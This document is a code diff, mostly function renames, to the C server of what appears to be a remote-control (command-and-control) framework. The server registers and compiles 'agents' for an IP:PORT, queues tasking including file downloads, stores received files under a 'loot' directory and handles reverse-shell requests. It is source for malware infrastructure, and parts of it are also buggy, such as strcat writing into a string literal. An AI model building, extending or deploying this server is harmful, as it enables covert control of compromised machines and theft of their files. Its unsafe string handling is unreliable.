@@ -155,10 +155,10 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
                 printf("Improper format: needs to be IP:PORT\n");
                 argp_usage(state);
             }
-            dbg = index_of(arg, ':', 0);
-            ip = substring(arg, dbg, strlen(arg));
+            dbg = misc_index_of(arg, ':', 0);
+            ip = misc_substring(arg, dbg, strlen(arg));
         
-            compile_agent(ip, port);
+            agent_compile(ip, port);
             break;
         case 'i':
             halt = 1;
@@ -167,10 +167,10 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
                 printf("Improper format: needs to be ID:PASSWORD\n");
                 argp_usage(state);
             }
-            dbg = index_of(arg, ':', 0);
-            id = substring(arg, dbg, strlen(arg));
+            dbg = misc_index_of(arg, ':', 0);
+            id = misc_substring(arg, dbg, strlen(arg));
 
-            register_agent(id, pass);
+            agent_register(id, pass);
             printf("Registered agent with %s and %s\n", id, pass);
             break;
         case ARGP_KEY_ARG:
@@ -268,7 +268,7 @@ void manager_handler(struct clientNode *node){
         case MANAG_EXIT:
             printf("Manager exit caught\n");
             pthread_mutex_lock(&session_lock);
-            remove_node(node);
+            list_remove_node(node);
             pthread_mutex_unlock(&session_lock);
             ssh_channel_close(manager->chan);
             ssh_free(manager->session);
@@ -477,6 +477,8 @@ void manager_handler(struct clientNode *node){
             }
             fwrite(temp, 1, size_e, file);
             fclose(file);
+
+            agent_task(AGENT_DOWN_FILE, ptr, filename);
             break;
 
         case MANAG_REQ_RVSH:
@@ -492,7 +494,7 @@ void manager_handler(struct clientNode *node){
             memset(buff, 0, sizeof(buff));
             // TODO: ZERO OUT ALL BUFFERS HERE
             // get filesize 
-            size = get_file(ptr, &dat_ptr);
+            size = misc_get_file(ptr, &dat_ptr);
         
             if(size < 0){
                 printf("Manager %s: filename '%s' does not exist\n", manager->id, buff); 
@@ -631,7 +633,7 @@ void agent_handler(struct clientNode *node){
         case AGENT_EXIT:
             printf("Agent exit caught\n");
             pthread_mutex_lock(&session_lock);
-            remove_node(node);
+            list_remove_node(node);
             pthread_mutex_unlock(&session_lock);
             ssh_channel_close(agent->chan);
             ssh_free(agent->session);
@@ -646,7 +648,7 @@ void agent_handler(struct clientNode *node){
             tmpbuffer[7] = '\0';
             
             // get filesize 
-            size = get_file(ptr, &dat_ptr);
+            size = misc_get_file(ptr, &dat_ptr);
             
             if(size < 0){
                 printf("Client %s: filename '%s' does not exist\n", agent->id, buff); 
@@ -692,7 +694,7 @@ void agent_handler(struct clientNode *node){
 
             // writes file 
             ssh_channel_write(agent->chan, "ok", 3);
-            clean_input(filename);
+            misc_clean_input(filename);
             strcat("loot/", filename);
             file = fopen(filename, "wb");
             fwrite(data_ptr, 1, size, file);
@@ -712,7 +714,7 @@ void agent_handler(struct clientNode *node){
             memset(buff, 0, sizeof(buff));
             // TODO: ZERO OUT ALL BUFFERS HERE
             // get filesize 
-            size = get_file(ptr, &dat_ptr);
+            size = misc_get_file(ptr, &dat_ptr);
         
             if(size < 0){
                 printf("Client %s: filename '%s' does not exist\n", agent->id, buff); 
@@ -785,7 +787,7 @@ void client_handler(void* sess){
         printf("Client %s: Channel error : %s\n", pass->id, ssh_get_error(pass->session));
         ssh_finalize();
         free(pass);
-        remove_node(node);
+        list_remove_node(node);
         return;
     }
     
@@ -809,7 +811,7 @@ void client_handler(void* sess){
 	if(!sftp){
 		printf("Client %s: SFTP error : %s\n", pass->id, ssh_get_error(pass->session));
         free(pass);
-        remove_node(node);
+        list_remove_node(node);
         return;
     }
     
@@ -831,16 +833,16 @@ void client_handler(void* sess){
             // Check if ID exists
             memset(buf, 0, sizeof(buf));
             strcat(buf, "agents/");
-            int exists = directory_exists(strcat(buf, agent_id));
+            int exists = misc_directory_exists(strcat(buf, agent_id));
         
             if(!exists){
-                init_agent(agent_id);
+                agent_init(agent_id);
                 printf("Client %s: Initialized agent\n", pass->id);
             }
 
             char tasking[2048];
             memset(tasking, 0, sizeof(tasking));
-            get_tasking(agent_id, tasking);
+            agent_get_tasking(agent_id, tasking);
             // Write tasking
             ssh_channel_write(pass->chan, tasking, strlen(tasking));
         
@@ -879,7 +881,7 @@ void *handle_conn(void *input){
             case SSH_REQUEST_AUTH:
                 switch(ssh_message_subtype(message)){
                     case SSH_AUTH_METHOD_PASSWORD:
-                        if(authenticate(ssh_message_auth_user(message), ssh_message_auth_password(message))){
+                        if(authenticate_doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                             auth=1;
                             name = malloc(strlen(ssh_message_auth_user(message)));
                             memset(name, 0, strlen(ssh_message_auth_user(message)));
@@ -925,7 +927,7 @@ void *handle_conn(void *input){
         node->data = pass;
         node->nxt = NULL;
         node->prev = NULL;
-        add_node(node, current);
+        list_add_node(node, current);
         pthread_mutex_unlock(&session_lock);
                 
         client_handler(node);
@@ -1006,7 +1008,7 @@ int main(int argc, char **argv){
     first.prev = NULL;
     
     // Initialize directories
-    init();    
+    misc_serverinit();    
 
     if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
         perror("Server: Socket Failure");   
